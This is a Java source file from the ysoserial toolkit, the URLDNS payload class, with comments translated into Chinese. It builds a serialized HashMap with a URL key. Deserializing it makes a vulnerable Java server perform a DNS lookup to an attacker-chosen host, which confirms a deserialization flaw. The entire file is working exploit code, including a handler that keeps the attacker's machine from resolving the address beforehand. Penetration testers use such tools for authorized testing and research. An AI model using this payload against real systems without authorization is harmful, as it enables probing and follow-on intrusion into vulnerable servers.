package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
*关于这个小工具链的更多细节的博客文章在下面的url:
* https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
＊
*灵感来自Philippe Arteau @h3xstream，他写了一篇博客
*描述他如何修改Java Commons Collections小工具的帖子
*在ysoserial打开一个URL。这采用了相同的思想，但消除了
*对公共集合的依赖，并做一个DNS查找
*标准JDK类。
＊
Java URL类在它的等号和上有一个有趣的属性
* hashCode方法。作为副作用，URL类将执行DNS查找
*在比较期间(equals或hashCode)。
＊
*作为反序列化的一部分，HashMap对它对应的每个键调用hashCode
*反序列化，因此使用Java URL对象作为序列化键允许
*它触发DNS查找。
＊
*小工具链:
* HashMap.readObject ()
* HashMap.putVal ()
*         HashMap.hash ()
*           URL.hashCode ()
＊
＊
*/
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //在创建有效负载时避免DNS解析
                //由于字段<code>java.net.URL.handler</code>是暂态的，因此它不会成为序列化有效负载的一部分。
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); //包含URL的HashMap
                URL u = new URL(null, url, handler); //作为Key的URL
                ht.put(u, url); //该值可以是任何可序列化的，URL作为关键字是触发DNS查找的。

                Reflections.setFieldValue(u, "hashCode", -1); //在上面的放置过程中，计算并缓存URL的hashCode。这将对其进行重置，以便下一次调用hashCode时将触发DNS查找。
                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

/**
* <p> URLStreamHandler的这个实例被用来在创建URL实例时避免任何DNS解析。
*使用DNS解析进行漏洞检测。重要的是不要预先探测给定的URL
*使用序列化对象。</p>
＊
* <b>潜在假阴性:</b>
* <p>如果DNS名称首先从测试计算机解析，目标服务器可能会在
*第二分辨率。</p>
*/
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
